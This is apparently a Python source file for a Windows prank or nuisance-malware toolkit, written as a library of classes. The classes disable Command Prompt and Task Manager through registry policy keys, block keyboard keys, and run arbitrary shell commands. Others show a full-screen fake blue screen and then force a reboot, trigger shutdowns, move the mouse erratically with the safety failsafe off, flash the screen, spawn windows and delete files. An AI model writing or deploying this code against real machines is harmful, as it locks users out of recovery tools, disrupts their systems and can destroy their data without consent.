import ctypes
import os
import time
import webbrowser
import requests
from tkinter import *
import socket
from tkinter import messagebox
from PIL import Image, ImageTk
import random
import pyautogui
import keyboard

class ChangeWallpaper:
    def __init__(self, path):
        self.path = path

        try:
            path = os.path.abspath(path)
            ctypes.windll.user32.SystemParametersInfoW(20, 0, path, 3)

            print(f"successfully changed wallpaper to {path}")
        except FileNotFoundError:
            raise FileNotFoundError(path)

class RunCommand:
    def __init__(self, command):
        self.command = command

        os.system(f"{command}")

class StartFile:
    def __init__(self, path):
        self.path = path
        try:
            os.startfile(path)
            print(f"Successfully started {path}")
        except FileNotFoundError:
            raise FileNotFoundError(path)

class OpenURL:
    def __init__(self, url):
        self.url = url

        try:
            webbrowser.open_new_tab(self.url)
            print(f"Successfully opened {url}")
        except requests.exceptions.RequestException:
            print(f"Failed to open {url}")

class BlockCmd:
    def __init__(self):
        os.system(f'REG ADD "HKCU\\Software\\Policies\\Microsoft\\Windows\\System" /v "DisableCMD" /t REG_DWORD /d 1 /f')
        print(f"Successfully blocked command prompt.")


class BlockTaskmgr:
    def __init__(self):
        os.system('REG ADD "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System" /v "DisableTaskMgr" /t REG_DWORD /d 1 /f')
        print("successfully blocked taskmgr.")

class Shutdown:
    def __init__(self, seconds):
        self.seconds = seconds

        os.system(f"shutdown /s /t {seconds}")

class Restart:
    def __init__(self, seconds):
        self.seconds = seconds

        os.system(f"shutdown /r /t {seconds}")

class BlackScreen:
    def __init__(self, seconds):
        self.seconds = seconds

        def destroy():
            ms = seconds * 1000
            window.after(ms, window.destroy)

        window = Tk()

        window.attributes("-fullscreen", True)
        window.attributes("-topmost", True)
        window.configure(bg="black")

        destroy()

        window.mainloop()

class IP:
    def __init__(self):
        ip = socket.gethostbyname(socket.gethostname())
        messagebox.showinfo("IP", ip)

class FakeBsod:
    def __init__(self):
        bsod_url = "https://esports.ch/wp-content/uploads/2024/07/windows10-bsod-1024x576.jpg"
        bsod_r = requests.get(bsod_url)
        with open("bsodImage.jpg", "wb") as file:
            file.write(bsod_r.content)

        bsod_path = os.path.abspath("bsodImage.jpg")

        def restart():
            def restart_command():
                os.system("shutdown /r /t 0")

            window.after(10000, lambda: restart_command())

        window = Tk()

        screen_height = window.winfo_screenheight()
        screen_width = window.winfo_screenwidth()

        bsod = Image.open(bsod_path).resize((screen_width, screen_height))
        bsod = ImageTk.PhotoImage(bsod)

        window.attributes("-fullscreen", True)
        window.attributes("-topmost", True)

        bsod_label = Label(window, image=bsod)
        bsod_label.pack()

        restart()

        window.mainloop()

class Flash:
    def __init__(self, times):
        self.times = times

        window = Tk()

        window.attributes("-fullscreen", True)
        window.attributes("-topmost", True)

        for i in range(times):
            window.config(bg="black")
            window.update()
            time.sleep(0.3)

            window.config(bg="white")
            window.update()
            time.sleep(0.1)

        window.destroy()

        window.mainloop()

class MouseChaos:
    def __init__(self, times):
        self.times = times

        for i in range(100):
            pyautogui.FAILSAFE = False
            random_x = random.randint(0, 1500)
            random_y = random.randint(0, 1500)

            pyautogui.mouseUp(random_x, random_y)

class Messagebox:
    def __init__(self, title, message, image):
        self.title = title
        self.message = message
        self.image = image

        if image == "error":
            messagebox.showerror(title, message)
        elif image == "warning":
            messagebox.showwarning(title, message)
        elif image == "info":
            messagebox.showinfo(title, message)

class RandomWindows:
    def __init__(self, times):
        global random_window
        self.times = times


        for i in range(times):
            windows = ["cmd", "explorer", "calculator", "notepad", "hackCmd"]
            random.shuffle(windows)

            random_window = windows.pop()

            if random_window == "cmd":
                os.system("start cmd")

            elif random_window == "explorer":
                os.system("start explorer")

            elif random_window == "calculator":
                os.system("start calc")

            elif random_window == "notepad":
                os.system("start notepad")

            elif random_window == "hackCmd":
                with open("hackCmd.bat", "w") as file:
                    file.write("""@echo off
color 0a
tree c:\\""")

                os.system("start hackCmd.bat")

class BlockKeys:
    def __init__(self, keys):
        self.keys = keys

        try:
            for key in keys:
                keyboard.block_key(key)
        except Exception as e:
            print(e)

class RemoveFile:
    def __init__(self, path):
        self.path = path

        try:
            os.remove(self.path)
        except FileNotFoundError:
            print(f"File {path} does not exist")

class CreateFile:
    def __init__(self, filename, file_content):
        self.file_name = filename
        self.file_content = file_content

        try:
            with open(filename, "w") as file:
                file.write(f"{file_content}")
        except FileExistsError:
            print(f"File {filename} already exists.")

class Mkdir:
    def __init__(self, dirname):
        try:
            os.makedirs(dirname)
        except FileExistsError:
            print("Directory already exists.")
